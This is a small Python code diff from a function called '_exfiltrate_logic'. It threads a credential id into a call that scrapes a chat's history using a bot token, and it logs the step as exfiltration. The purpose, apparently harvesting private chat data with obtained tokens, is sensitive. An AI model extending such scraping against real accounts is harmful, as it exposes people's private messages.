@@ -390,7 +390,9 @@ async def _exfiltrate_logic(cred_id: str):
         logger.info(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
         await broadcaster.send_log(f"⏳ Scraping chat `{chat_id}`...")
 
-        scrape_result = await scraper_service.scrape_history(bot_token, chat_id)
+        scrape_result = await scraper_service.scrape_history(
+            bot_token, chat_id, credential_id=cred_id
+        )
         await _persist_scrape_classification(cred_id, scrape_result)
         messages = list(getattr(scrape_result, "messages", scrape_result))
 
